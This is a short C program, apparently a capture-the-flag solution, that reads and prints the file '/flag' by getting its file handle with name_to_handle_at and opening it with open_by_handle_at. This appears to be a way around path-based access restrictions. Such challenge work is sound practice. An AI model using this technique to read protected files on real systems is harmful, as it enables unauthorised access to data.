#define _GNU_SOURCE
#include<stdio.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<stdlib.h>
#include<unistd.h>

//author : afang
//comment: what a nice day, isn't it?!

int main(){
	
	char *path = "/flag";
	struct file_handle *fhp;
	int flags = 0;
	int mount_id = 0;
	int dirfd = AT_FDCWD;
	int sizer = sizeof(*fhp);
	fhp = malloc(sizer);
	fhp->handle_bytes = 0;
	name_to_handle_at(dirfd, path, fhp, &mount_id, flags);
	int size = sizeof(struct file_handle) + fhp->handle_bytes;
	fhp = realloc(fhp, size);
	name_to_handle_at(dirfd, path, fhp, &mount_id, flags);
	//acquire structure and access flag!
	int fd = open_by_handle_at(AT_FDCWD, fhp , O_RDONLY);
	char a[512];
	int r = read(fd, a, 500);
	printf("%s", a);

	return 0;
}

